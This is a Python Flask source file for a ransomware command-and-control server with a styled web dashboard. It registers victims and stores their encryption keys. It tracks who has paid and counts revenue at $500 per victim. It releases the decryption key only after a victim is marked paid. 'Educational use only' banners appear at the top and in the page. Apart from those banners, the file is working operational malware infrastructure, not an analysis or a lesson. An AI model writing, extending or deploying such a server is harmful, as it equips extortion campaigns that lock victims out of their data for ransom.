"""
C2 Server with Web Dashboard
Educational Use Only
"""

from flask import Flask, request, jsonify, render_template_string
import sqlite3
from datetime import datetime
import json
import os

app = Flask(__name__)

# HTML Template for Web Dashboard
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Ransomware C2 Dashboard - Educational Demo</title>
    <style>
        body { 
            font-family: 'Segoe UI', Arial, sans-serif; 
            margin: 0; 
            padding: 20px; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #333;
            min-height: 100vh;
        }
        .container { 
            max-width: 1200px; 
            margin: 0 auto; 
            background: white;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            overflow: hidden;
        }
        .header { 
            background: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
            padding: 30px; 
            color: white;
            text-align: center;
        }
        .stats { 
            display: grid; 
            grid-template-columns: repeat(4, 1fr); 
            gap: 20px; 
            padding: 20px;
            background: #f8f9fa;
        }
        .stat-card { 
            background: white;
            padding: 25px; 
            border-radius: 10px; 
            text-align: center;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            border-left: 4px solid #3498db;
        }
        .victims-list { 
            background: white; 
            padding: 30px;
            margin: 20px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        .victim { 
            background: #f8f9fa; 
            margin: 15px 0; 
            padding: 20px; 
            border-radius: 8px;
            border-left: 5px solid #e74c3c;
            transition: transform 0.2s;
        }
        .victim:hover {
            transform: translateX(5px);
        }
        .victim.paid { 
            border-left-color: #27ae60;
        }
        button { 
            background: #3498db; 
            color: white; 
            border: none; 
            padding: 12px 25px; 
            border-radius: 6px; 
            cursor: pointer; 
            font-size: 14px;
            transition: background 0.3s;
            margin: 5px;
        }
        button:hover { 
            background: #2980b9; 
        }
        button.success {
            background: #27ae60;
        }
        button.success:hover {
            background: #219653;
        }
        .log { 
            background: white; 
            padding: 30px;
            margin: 20px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            max-height: 400px; 
            overflow-y: auto;
            font-family: 'Courier New', monospace;
        }
        .log-entry {
            padding: 8px 0;
            border-bottom: 1px solid #eee;
        }
        .warning {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            padding: 15px;
            margin: 20px;
            border-radius: 8px;
            text-align: center;
            color: #856404;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔴 Ransomware C2 Dashboard - EDUCATIONAL DEMO</h1>
            <p>Command and Control Server - For Cybersecurity Education Only</p>
        </div>

        <div class="warning">
            <strong>⚠️ EDUCATIONAL USE ONLY</strong> - This is a demo environment for cybersecurity training
        </div>

        <div class="stats">
            <div class="stat-card">
                <h3>Total Victims</h3>
                <h2 style="color: #3498db;">{{ total_victims }}</h2>
            </div>
            <div class="stat-card">
                <h3>Paid</h3>
                <h2 style="color: #27ae60;">{{ paid_victims }}</h2>
            </div>
            <div class="stat-card">
                <h3>Unpaid</h3>
                <h2 style="color: #e74c3c;">{{ unpaid_victims }}</h2>
            </div>
            <div class="stat-card">
                <h3>Revenue</h3>
                <h2 style="color: #f39c12;">${{ revenue }}</h2>
            </div>
        </div>

        <div class="victims-list">
            <h2>📋 Victim List</h2>
            <div id="victims">
                {% for victim in victims %}
                <div class="victim {{ 'paid' if victim.paid else 'unpaid' }}">
                    <strong>ID:</strong> {{ victim.victim_id }}<br>
                    <strong>Time:</strong> {{ victim.timestamp }}<br>
                    <strong>Status:</strong> 
                    <span style="color: {{ '#27ae60' if victim.paid else '#e74c3c' }}">
                        {{ 'PAID' if victim.paid else 'UNPAID' }}
                    </span>
                    {% if not victim.paid %}
                    <button onclick="markPaid('{{ victim.victim_id }}')">Mark as Paid</button>
                    {% else %}
                    <button class="success" onclick="getDecryptionKey('{{ victim.victim_id }}')">Get Decryption Key</button>
                    {% endif %}
                </div>
                {% endfor %}
            </div>
        </div>

        <div class="log">
            <h2>📊 Activity Log</h2>
            <div id="activityLog">
                {% for log in activity_log %}
                <div class="log-entry">[{{ log.timestamp }}] {{ log.message }}</div>
                {% endfor %}
            </div>
        </div>
    </div>

    <script>
        function markPaid(victimId) {
            if (confirm(`Mark victim ${victimId} as PAID? This will simulate payment.`)) {
                fetch(`/mark_paid/${victimId}`)
                    .then(response => response.json())
                    .then(data => {
                        if (data.status === 'payment_confirmed') {
                            alert(`✅ Victim ${victimId} marked as PAID - Ready for decryption`);
                            location.reload();
                        }
                    });
            }
        }

        function getDecryptionKey(victimId) {
            fetch(`/get_key/${victimId}`)
                .then(response => response.json())
                .then(data => {
                    if (data.encrypted_key) {
                        alert(`🔑 Decryption Key for ${victimId}:\n\n${data.encrypted_key}\n\nUse this with the decryptor tool.`);
                    } else {
                        alert('❌ Error retrieving key');
                    }
                });
        }

        // Auto-refresh every 5 seconds
        setInterval(() => {
            location.reload();
        }, 5000);
    </script>
</body>
</html>
"""

class C2ServerWithGUI:
    def __init__(self):
        self.app = Flask(__name__)
        self.activity_log = []
        self.setup_routes()
        self.init_db()

    def init_db(self):
        conn = sqlite3.connect('victims.db')
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS victims
                     (victim_id TEXT PRIMARY KEY, 
                      encrypted_key TEXT,
                      timestamp TEXT,
                      paid INTEGER DEFAULT 0,
                      decrypted INTEGER DEFAULT 0)''')
        conn.commit()
        conn.close()
        self.log_activity("Database initialized")

    def log_activity(self, message):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = {"timestamp": timestamp, "message": message}
        self.activity_log.append(log_entry)
        # Keep only last 50 entries
        if len(self.activity_log) > 50:
            self.activity_log.pop(0)
        print(f"[{timestamp}] {message}")

    def setup_routes(self):
        @self.app.route('/')
        def dashboard():
            conn = sqlite3.connect('victims.db')
            c = conn.cursor()
            
            # Get victim statistics
            c.execute("SELECT COUNT(*) FROM victims")
            total_victims = c.fetchone()[0]
            
            c.execute("SELECT COUNT(*) FROM victims WHERE paid=1")
            paid_victims = c.fetchone()[0]
            
            unpaid_victims = total_victims - paid_victims
            revenue = paid_victims * 500  # $500 per victim
            
            # Get all victims
            c.execute("SELECT victim_id, timestamp, paid FROM victims ORDER BY timestamp DESC")
            victims_data = c.fetchall()
            conn.close()
            
            victims = []
            for victim in victims_data:
                victims.append({
                    'victim_id': victim[0],
                    'timestamp': victim[1],
                    'paid': bool(victim[2])
                })
            
            return render_template_string(DASHBOARD_HTML,
                total_victims=total_victims,
                paid_victims=paid_victims,
                unpaid_victims=unpaid_victims,
                revenue=revenue,
                victims=victims,
                activity_log=self.activity_log[-10:]  # Last 10 entries
            )

        @self.app.route('/register', methods=['POST'])
        def register_victim():
            data = request.json
            victim_id = data.get('victim_id')
            encrypted_key = data.get('encrypted_key')
            timestamp = data.get('timestamp', datetime.now().isoformat())
            
            conn = sqlite3.connect('victims.db')
            c = conn.cursor()
            
            try:
                c.execute("INSERT INTO victims VALUES (?, ?, ?, ?, ?)",
                          (victim_id, encrypted_key, timestamp, 0, 0))
                conn.commit()
                
                self.log_activity(f"New victim registered: {victim_id}")
                return jsonify({"status": "registered", "victim_id": victim_id})
            
            except sqlite3.IntegrityError:
                return jsonify({"status": "already_registered"})
            finally:
                conn.close()

        @self.app.route('/check_payment/<victim_id>')
        def check_payment(victim_id):
            conn = sqlite3.connect('victims.db')
            c = conn.cursor()
            c.execute("SELECT paid, encrypted_key FROM victims WHERE victim_id=?", (victim_id,))
            result = c.fetchone()
            conn.close()
            
            if result:
                paid, encrypted_key = result
                return jsonify({"paid": bool(paid), "encrypted_key": encrypted_key})
            
            return jsonify({"error": "victim_not_found"}), 404

        @self.app.route('/mark_paid/<victim_id>')
        def mark_paid(victim_id):
            conn = sqlite3.connect('victims.db')
            c = conn.cursor()
            c.execute("UPDATE victims SET paid=1 WHERE victim_id=?", (victim_id,))
            conn.commit()
            
            # Check if update was successful
            c.execute("SELECT paid FROM victims WHERE victim_id=?", (victim_id,))
            result = c.fetchone()
            conn.close()
            
            if result and result[0] == 1:
                self.log_activity(f"Victim marked as paid: {victim_id}")
                return jsonify({"status": "payment_confirmed"})
            
            return jsonify({"error": "victim_not_found"}), 404

        @self.app.route('/victims')
        def list_victims():
            conn = sqlite3.connect('victims.db')
            c = conn.cursor()
            c.execute("SELECT victim_id, timestamp, paid FROM victims ORDER BY timestamp DESC")
            victims = c.fetchall()
            conn.close()
            
            victim_list = []
            for victim in victims:
                victim_list.append({
                    'victim_id': victim[0],
                    'timestamp': victim[1],
                    'paid': bool(victim[2])
                })
            
            return jsonify({"victims": victim_list})

        @self.app.route('/get_key/<victim_id>')
        def get_key(victim_id):
            conn = sqlite3.connect('victims.db')
            c = conn.cursor()
            c.execute("SELECT encrypted_key, paid FROM victims WHERE victim_id=?", (victim_id,))
            result = c.fetchone()
            conn.close()
            
            if result:
                encrypted_key, paid = result
                if paid:
                    return jsonify({"encrypted_key": encrypted_key})
                else:
                    return jsonify({"error": "payment_required"}), 402
            
            return jsonify({"error": "victim_not_found"}), 404

    def run(self, host='0.0.0.0', port=5000):
        print(f"[+] C2 Server with GUI starting on http://{host}:{port}")
        print("[+] Access the dashboard in your web browser")
        self.app.run(host=host, port=port, debug=True)

if __name__ == '__main__':
    server = C2ServerWithGUI()
    server.run()